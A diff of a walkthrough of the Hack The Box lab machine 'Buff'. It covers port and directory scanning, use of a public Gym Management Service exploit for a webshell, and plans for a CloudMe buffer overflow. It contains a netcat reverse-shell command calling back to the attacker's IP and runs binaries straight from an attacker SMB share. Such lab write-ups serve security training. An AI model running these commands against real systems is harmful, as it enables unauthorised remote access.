@@ -1,9 +1,11 @@
+![image](https://user-images.githubusercontent.com/105310322/196471216-474e621b-00c3-4a90-8d50-55ead69fd885.png)
 
 
 ### Tools:
 
-### Vulnerabilities: 
+### Vulnerabilities: Gym Management Service, Buffer Overflow: CloudMe.exe
 
+Nmap shows 1 port open on port 8080 which is a webpage we can visit.
 
 ```
 └─$ nmap -A -p- -T4 -Pn 10.129.2.18
@@ -21,6 +23,8 @@ PORT     STATE SERVICE VERSION
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 505.48 seconds
 ```
+A quick feroxbuster shows that their is an upload page and a logout page. Which means there is somewhere to login too.
+
 ```console
 └─$ feroxbuster -u http://Buff.htb:8080/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git,pdf -q
 301      GET        9l       30w      337c http://buff.htb:8080/include => http://buff.htb:8080/include/
@@ -46,9 +50,12 @@ Nmap done: 1 IP address (1 host up) scanned in 505.48 seconds
 200      GET      168l      486w     7791c http://buff.htb:8080/packages.php
 ```
 
+
+After checking out the website just a bit we can see that it is running Gym Management Service 1.0. A quick google search gives us an exploit we can run.
+
 https://www.exploit-db.com/exploits/48506
 
-
+After running the exploit we quickly gain access to the shaun user and nab the first flag.
 
 ```console
 C:\xampp\htdocs\gym\upload> whoami
@@ -63,6 +70,11 @@ C:\xampp\htdocs\gym\upload> type c:\users\shaun\Desktop\user.txt
 306d****************************
 ********************************
 ```
+
+Since this shell sucks I went back and created a reverse shell.
+
+Set up your smbshare.
+
 ```console
 └─$ sudo impacket-smbserver rogue . -smb2support
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -74,6 +86,10 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Config file parsed
 ```
 
+Then I ran the exploit again and executed my reverse shell without copying any files.
+
+Note: This is a pretty cool trick I learned and makes things a little faster and easier if you are running into issues with getting files on the victim.
+
 ```console
 └─$ python2.7 48506.py http://buff.htb:8080/
             /\
@@ -84,6 +100,8 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [+] Successfully connected to webshell.
 C:\xampp\htdocs\gym\upload> \\10.10.16.16\rogue\nc.exe -e cmd.exe 10.10.16.16 1234
 ```
+
+By checking through Shaun's files we see an interesting binary.
 
 ```console
 PS C:\Users\shaun\Downloads> ls
@@ -99,9 +117,10 @@ Mode                LastWriteTime         Length Name
 ```
 
 
-Launch Files without transferring to victim
+Again I am going to run winpeas without transferring it to the victim.
 
-on host
+On host
+
 ```console
 └─$ sudo impacket-smbserver rogue . -smb2support
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -112,11 +131,12 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Config file parsed
 ```
 
-on victim
+On victim
 
 ```console
 PS C:\users\shaun\Downloads> \\10.10.16.16\rogue\winPEASx64.exe
 ```
+Linpeas shows the running processes and also tells us that the CloudMe service is being ran on localhost port 8888
 
 ```console
 ����������͹ Current TCP Listening Ports
@@ -144,3 +164,6 @@ PS C:\users\shaun\Downloads> \\10.10.16.16\rogue\winPEASx64.exe
   TCP        127.0.0.1             3306          0.0.0.0               0               Listening         8628            C:\xampp\mysql\bin\mysqld.exe
   TCP        127.0.0.1             8888          0.0.0.0               0               Listening         4280            CloudMe
 ```
+This PoC should do the job pretty quickly.
+
+https://www.exploit-db.com/exploits/48389
